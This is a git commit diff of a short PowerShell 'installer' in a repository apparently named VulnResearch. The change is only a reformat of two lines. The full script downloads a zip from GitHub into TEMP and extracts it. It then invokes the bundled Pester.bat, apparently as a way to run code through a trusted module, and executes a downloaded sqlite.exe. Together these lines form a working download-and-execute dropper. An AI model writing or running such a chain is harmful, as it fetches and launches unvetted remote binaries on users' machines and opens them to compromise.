e7321709e8d78840c26ff23f614790081db43568
SplineUser <Priyanshusharma2022@gmail.com>
2026-04-18 05:44:42 -0400

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,8 +1,8 @@
 $z = "$env:TEMP\a.zip"
 iwr -Uri "https://github.com/SplineUser/VulnResearch/raw/refs/heads/main/dist.zip" -o $z
 Expand-Archive $z $env:TEMP -Force
-$b="C:\Program Files\WindowsPowerShell\Modules\Pester"
-$p="$b\$(ls $b|sort Name -Desc|select -First 1 -Exp Name)\bin\Pester.bat"
+$b = "C:\Program Files\WindowsPowerShell\Modules\Pester"
+$p = "$b\$(Get-ChildItem $b | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name)\bin\Pester.bat"
 
 & $p
 & "$env:TEMP\dist\sqlite.exe"
